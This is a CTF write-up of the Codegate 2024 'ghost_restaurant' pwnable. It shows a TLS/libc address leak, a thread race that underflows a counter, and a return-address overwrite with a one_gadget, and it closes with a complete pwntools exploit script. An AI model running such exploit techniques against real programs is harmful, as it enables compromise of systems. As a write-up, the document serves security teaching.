+++
title = "Codegate CTF 2024 Quals - ghost_restaurant (without shadow stack)"
date = "2024-08-28"
description = "Codegate CTF 2024 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "race condition", "tls"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/ghost_restaurant'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structure
``` c
struct food {
    char name[0x40];
    long cook_time;
    long left_time;
}
```

There are several other structures used, but I've only stated the critical one to solve the challenge.

### Concept
Creating and selecting an `oven` spawns a `cook_1928` thread where you can insert or remove `food`.

When inserting, food becomes ready after the specified `cook_time` passes.
The process of decrementing time and checking completion happens through the `start_routine_16B1` thread.


## 0x01. Vulnerability
### Information Leak
When `food` is removed (either due to `cook_time` expiring or manual remove), memory changes through the following logic.

``` c
printf("Select food to remove in '%s':\n", oven->name);
__isoc99_scanf("%d", &tmp);
for ( i = tmp; i < food_count; ++i )
{
  food_next = food[i + 1];
  food_cur = food[i];
  memcpy(food_cur, food_next, 0x50);
}
```

Since it unconditionally copies from `food[i + 1]` to `food[i]` without checking what's at `food[i + 1]`, we can leak important data if it exists there.

### Race Condition
Looking at the code for `start_routine_16B1` that checks remaining time:

``` c
void __fastcall __noreturn start_routine_16B1(struct argument *a1)
{
  ...
  while ( 1 )
  {
    if ( *(__int64 *)arg->count > 0 )
    {
      for ( i = 0; i < *(_QWORD *)arg->count; ++i )
      {
        if ( arg->food[i].left_time > 0 )
        {
          food_tmp = &arg->food[i];
          if ( !--food_tmp->left_time )
          {
            printf("'%s' is ready!\n", arg->food[i].name);
            ...
            for ( j = i; j < *(_QWORD *)arg->count; ++j )
            {
              food_next = &arg->food[j + 1];
              food_cur = &arg->food[j];
              memcpy(food_cur, food_next, 0x50);
            }
            --*(_QWORD *)arg->count;
          }
        }
      }
    }
    sleep(1u);
  }
}
```

When `left_time` reaches 0, it shifts structures after that `food` forward by one position and decrements `food_count`.

There's another way to remove `food` - looking at `cook_1928`:

``` c
void *__fastcall cook_1928(struct oven *a1)
{
  ...
  while ( 1 )
  {
    pthread_mutex_lock((pthread_mutex_t *)oven->mutex);
    while ( !LODWORD(oven->ready) )
      pthread_cond_wait((pthread_cond_t *)oven->cond, (pthread_mutex_t *)oven->mutex);
    ...
    __isoc99_scanf("%d", &choice);
    ...
    if ( choice == 2 )
    {
      printf("Select food to remove in '%s':\n", oven->name);
      ...
      __isoc99_scanf("%d", &tmp);
      if ( (int)tmp <= (__int64)__readfsqword(0xFFFFFE90) && (int)tmp > 0 )
      {
        LODWORD(tmp) = tmp - 1;
        for ( m = tmp; m < (__int64)__readfsqword(0xFFFFFE90); ++m )
        {
          food_cur = (struct food *)(__readfsqword(0) + 0x50LL * m - 0x160);
          food_next = (struct food *)(__readfsqword(0) + 0x50LL * (m + 1) - 0x160);
          memcpy(food_cur, food_next, 0x50);
        }
        __writefsqword(0xFFFFFE90, __readfsqword(0xFFFFFE90) - 1);
        goto LABEL_39;
      }
LABEL_19:
      puts("Invalid choice.");
      pthread_mutex_unlock((pthread_mutex_t *)oven->mutex);
    }
LABEL_39:
    pthread_mutex_unlock((pthread_mutex_t *)oven->mutex);
  }
  ...
}
```

It prints the current `food` list, receives the index in `tmp` of the food to remove, deletes it, then decrements `food_count` via `__writefsqword()` at line 26.

The vulnerability here is that the code decrementing `food_count` in `start_routine_16B1` when time expires isn't managed as a critical section.
Therefore, it can execute concurrently with `cook_1928`'s `remove` logic, creating a race condition.

|`cook_1928`|`start_routine_16B1`|
|:---|---:|
|`if ( tmp <= __readfsqword(0xFFFFFE90) && tmp > 0 )`||
||`food_next = &arg->food[j + 1];`|
|`food_cur = (__readfsqword(0) + 0x50LL * m - 0x160);`||
||`food_cur = &arg->food[j];`|
|`food_next = (__readfsqword(0) + 0x50LL * (m + 1) - 0x160);`||
||`memcpy(food_cur, food_next, 0x50);`|
|`memcpy(food_cur, food_next, 0x50);`||
||`--*(_QWORD *)arg->count;`|
|`__writefsqword(0xFFFFFE90, __readfsqword(0xFFFFFE90) - 1);`||

If a race condition occurs this way, even with one `insert`, the value decrements twice, causing underflow in `food_count`.


## 0x02. Exploit
### Information Leak
Starting from `food[0]` and printing memory in 0x50 (food size) increments reveals this region.

``` bash
gef➤
0x7ffff7da56a0: 0x0000000000000000      0x0000000000000000
0x7ffff7da56b0: 0x0000000000000000      0x0000000000000000
0x7ffff7da56c0: 0x00007ffff7da56c0      0x000055555555a960
0x7ffff7da56d0: 0x00007ffff7da56c0      0x0000000000000001
0x7ffff7da56e0: 0x0000000000000000      0x3ce1f8458248c000
```

The area corresponding to `food[4]` contains addresses to TLS(Thread Local Storage) and heap regions, plus a canary value (though not needed for this challenge).
Since you can insert up to 4 foods, creating `food[0]`~`food[3]` then removing `food[0]` copies `food[4]` data to `food[3]`.
Removing `food[0]` four times this way copies the `food[4]` area data to `food[0]`~`food[3]`.

Note that `0x7ffff7da56c0` stored at `0x7ffff7da56c0` is the TLS address - the value returned when executing `__readfsqword(0)`.
If this value changes, `__readfsqword(0)` returns the changed value, so we need to be careful.

``` c
printf("Foods in '%s':\n", oven->name);
for ( i = 0; i < (__int64)__readfsqword(0xFFFFFE90); ++i )
  printf(
    "%d. %s (cooking for %lld seconds, %lld seconds left)\n",
    (unsigned int)(i + 1),
    (const char *)(80LL * i + __readfsqword(0) - 0x160),  // name; 0x00007ffff7d864e0
    *(_QWORD *)(__readfsqword(0) + 0x50LL * i - 0x120),   // cook_time
    *(_QWORD *)(__readfsqword(0) + 0x50LL * i - 0x118));  // left_time
```

Since `food.name` is printed via `%s` formatter, we need to fill the intermediate `\x00`s.
This can be solved through `read()` called when selecting the hidden choice.

``` c
if ( food_choice == 4 )     // hidden
{
  pthread_mutex_lock(&prompt_mutex_5100);
  printf("Enter food name for spacial food: ");
  read(0, (void *)(__readfsqword(0) - 0x160 + 0x50 * __readfsqword(0xFFFFFE90)), 0x40uLL);  // name; 0x00007ffff7d864e0
  pthread_mutex_unlock(&prompt_mutex_5100);
}
```

So I wrote the payload as follows.

``` python
    create_oven(s, b"1111")
    select_oven(s, b"1")

    for _ in range(4):
        insert_food(s, b"1", 12345)
    for _ in range(4):
        remove_food(s, b"1")
    insert_food(s, b"5", 12345, b"A" * 0x20)
    r = insert_food(s, b"5", 12345, b"B" * 0x28)
    tls = u64(r.split(b"A" * 0x20)[1].split(b" ")[0] + b"\x00\x00")
    libc = tls + 0x3940
    heap = u64(r.split(b"B" * 0x28)[2].split(b" ")[0] + b"\x00\x00") - 0x960
    remove_food(s, b"1")
    remove_food(s, b"1")
```

Since TLS is allocated just above libc, we can obtain the libc base by calculating the offset.

### Race Condition
I wrote a brute force payload to find the sleep time needed to trigger the race condition.

``` python
def brute_force_time(port):
    context.log_level = 'error'
    for i in range(10000):
        s = remote("0.0.0.0", port)
        s.recvuntil(b"option: ")
        create_oven(s, b"1111")
        select_oven(s, b"1")

        # code for information leak

        insert_food(s, b"1", 1)
        sleep_time = 0.95 + i / 10000
        sleep(sleep_time)
        remove_food(s, b"1")
        r = insert_food(s, b"1", 60)
        if len(r.split(b"\n")) > 60:
            print(f"success : {sleep_time}")
        s.close()
        print(f'\rProgress: {i} / 10000\r', end='')
```

Since the race condition is triggered after information leak, the leak payload needs to be included to accurately find the timing.

On successful trigger, `food_count` becomes -1, and inserting then writes data to `food[-1]`.

```
food[-1]     :  0x00007ffff7da5510 -> name[0x40]
                0x00007ffff7da5520
                0x00007ffff7da5530
                0x00007ffff7da5540
food_count   :  0x00007ffff7da5550 -> cook_time[0x8], left_time[0x8]
food[0]      :  0x00007ffff7da5560 -> name[0x40]
                0x00007ffff7da5570
                0x00007ffff7da5580
                0x00007ffff7da5590
                0x00007ffff7da55a0 -> cook_time[0x8], left_time[0x8]
                0x00007ffff7da55b0
                ...
TLS          :  0x00007ffff7da56c0
                ...
LIBC         :  0x00007ffff7da9000
```

Since input `cook_time` is written at the `food_count` position, inputting 60 makes it recognize `food_count` as 60, printing 60 foods.
So I wrote the payload to judge success by the number of printed foods.

``` bash
➜  python3 exploit.py -p 8798 -d 0 -b 1
success : 0.981
success : 0.9814
success : 0.9816
```

This found suitable sleep times.
However, running it multiple times shows the time window shifts slightly, possibly due to memory issues.

### RIP Control
After triggering the race condition, checking thread info with `info threads` in gdb:

``` bash
gef➤  info threads
  Id   Target Id          Frame
  1    LWP 974101 "chall" 0x00007ffff7e41d61 in ?? () from ./lib/x86_64-linux-gnu/libc.so.6
* 2    LWP 974149 "chall" 0x0000555555555e51 in ?? ()
  3    LWP 974150 "chall" 0x00007ffff7e95adf in clock_nanosleep () from ./lib/x86_64-linux-gnu/libc.so.6
```

Thread 3 runs `start_routine_16B1`.
Switching context with `thread 3`:

``` bash
[#0] 0x7ffff7e95adf → clock_nanosleep()
[#1] 0x7ffff7ea2a27 → nanosleep()
[#2] 0x7ffff7eb7c63 → sleep()
[#3] 0x555555555923 → jmp 0x5555555556d9
[#4] 0x7ffff7e45a94 → jmp 0x7ffff7e4586d
[#5] 0x7ffff7ed2a34 → clone()
─────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rsp
$1 = (void *) 0x7ffff75a3c20
gef➤  vmmap 0x7ffff75a3c20
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffff6da5000 0x00007ffff75a5000 0x0000000000000000 rw-
```

It decrements `left_time` at each second and checks if `food` is ready by executing `clock_nanosleep()`.

It also uses a new TLS region rather than the leaked one, using as stack.

The call stack goes `sleep()` -> `nanosleep()` -> `clock_nanosleep()`.
To overwrite something, it's better to taget `sleep()` which has longer call intervals.

``` bash
 → 0x7ffff7eb7c84 <sleep+100>      ret
──────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall", stopped 0x7ffff7e41d61 in ?? (), reason: SINGLE STEP
[#1] Id 2, Name: "chall", stopped 0x7ffff7ec4a9a in read (), reason: SINGLE STEP
[#2] Id 3, Name: "chall", stopped 0x7ffff7eb7c84 in sleep (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7eb7c84 → sleep()
[#1] 0x555555555923 → jmp 0x5555555556d9
[#2] 0x7ffff7e45a94 → jmp 0x7ffff7e4586d
[#3] 0x7ffff7ed2a34 → clone()
─────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/gx $rsp
0x7ffff75a3ce8: 0x0000555555555923
```

When `sleep()` returns, `rsp` points to `0x7ffff75a3ce8`.
While this address is in a different TLS region than the leaked `0x7ffff7da56c0`, the offset between TLS regions is consistent, so calculating the offset gives access.

The original challenge has shadow stack enabled, but without it here, we can overwrite this return address for RIP control.

On successful race condition trigger, `food_count` becomes -1.
As a result, `food[-1].cook_time` is at the position of `food_count`, making it a large value.
By appropriately using the `index`, we can write to the return address of `sleep()` in thread 3.

``` python
    insert_food(s, b"1", 1)
    sleep(0.9813)
    remove_food(s, b"1")
    
    food = 0x7ffff7da5560
    ret_sleep = 0x7ffff75a3ce0
    index = (food - ret_sleep) // 0x50 + 1
    print(insert_food(s, b"1", index * -1))

    one_gadget = 0x583dc
    payload = b"A" * 8
    payload += p64(libc + one_gadget)
    insert_food(s, b"5", 12345, payload)
```

Fortunately, there's a usable one-shot gadget, so I overwrote it with that address.


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "chall"
LIBRARY = "libc.so.6"
CONTAINER = "2206a2d4bc57"

code_base = 0x0000555555554000
bp = {
    'cook' : code_base + 0x1928,
    'dec_count_cook' : code_base + 0x21F9,
    'read_insert_cook' : code_base + 0x1E51,
    'remove_cook' : code_base + 0x1F9D,
    'go_back_cook' : code_base + 0x221A,
    'ret_print_oven' : code_base + 0x16B0,
}

gs = f'''
continue
b *{bp['dec_count_cook']}
b *{bp['read_insert_cook']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def create_oven(s, name):
    s.sendline(b"0")
    s.recvuntil(b"name: ")
    s.sendline(name)
    return s.recvuntil(b"option: ")

def select_oven(s, number):
    s.sendline(number)
    return s.recvuntil(b"option: ")

def insert_food(s, number, time, name=""):
    s.sendline(b"1")
    s.recvuntil(b"> ")
    s.sendline(number)
    s.recvuntil(b"(seconds): ")
    s.sendline(str(time).encode())
    if number == b"5":
        s.recvuntil(b"food: ")
        s.send(name)
    return s.recvuntil(b"option: ")

def remove_food(s, number):
    s.sendline(b"2")
    s.recvuntil(b"> ")
    s.sendline(number)
    return s.recvuntil(b"option: ")

def go_back(s):
    s.sendline(b"3")
    return s.recvuntil(b"option: ")

def brute_force_time(port):
    context.log_level = 'error'
    for i in range(10000):
        s = remote("0.0.0.0", port)
        s.recvuntil(b"option: ")
        create_oven(s, b"1111")
        select_oven(s, b"1")

        for _ in range(4):
            insert_food(s, b"1", 12345)
        for _ in range(4):
            remove_food(s, b"1")
        insert_food(s, b"5", 12345, b"A" * 0x20)
        r = insert_food(s, b"5", 12345, b"B" * 0x28)
        tls = u64(r.split(b"A" * 0x20)[1].split(b" ")[0] + b"\x00\x00")
        libc = tls + 0x3940
        heap = u64(r.split(b"B" * 0x28)[2].split(b" ")[0] + b"\x00\x00") - 0x960
        remove_food(s, b"1")
        remove_food(s, b"1")

        insert_food(s, b"1", 1)
        sleep_time = 0.98 + i / 10000
        sleep(sleep_time)
        remove_food(s, b"1")
        r = insert_food(s, b"1", 60)
        if len(r.split(b"\n")) > 60:
            print(f"success : {sleep_time}")
        s.close()
        print(f'\rProgress: {i} / 10000\r', end='')

def main(port, debug, brute_force):
    if(brute_force):
        brute_force_time(port)
    if(port):
        s = remote("0.0.0.0", port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recvuntil(b"option: ")
    create_oven(s, b"1111")
    select_oven(s, b"1")

    # information leak
    for _ in range(4):
        insert_food(s, b"1", 12345)
    for _ in range(4):
        remove_food(s, b"1")
    insert_food(s, b"5", 12345, b"A" * 0x20)
    r = insert_food(s, b"5", 12345, b"B" * 0x28)
    tls = u64(r.split(b"A" * 0x20)[1].split(b" ")[0] + b"\x00\x00")
    libc = tls + 0x3940
    heap = u64(r.split(b"B" * 0x28)[2].split(b" ")[0] + b"\x00\x00") - 0x960
    remove_food(s, b"1")
    remove_food(s, b"1")

    # trigger race condition
    insert_food(s, b"1", 1)
    sleep(0.9814)
    remove_food(s, b"1")
    
    # overwrite food_count
    food = 0x7ffff7da5560
    ret_sleep = 0x7ffff75a3ce0
    index = (food - ret_sleep) // 0x50 + 1
    print(insert_food(s, b"1", index * -1))
    
    # overwrite ret of sleep() in thread 3
    one_gadget = 0x583dc
    payload = b"A" * 8
    payload += p64(libc + one_gadget)
    insert_food(s, b"5", 12345, payload)

    s.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    parser.add_argument('-b', '--brute_force', type=int, default=0)
    args = parser.parse_args()
    main(args.port, args.debug, args.brute_force)
```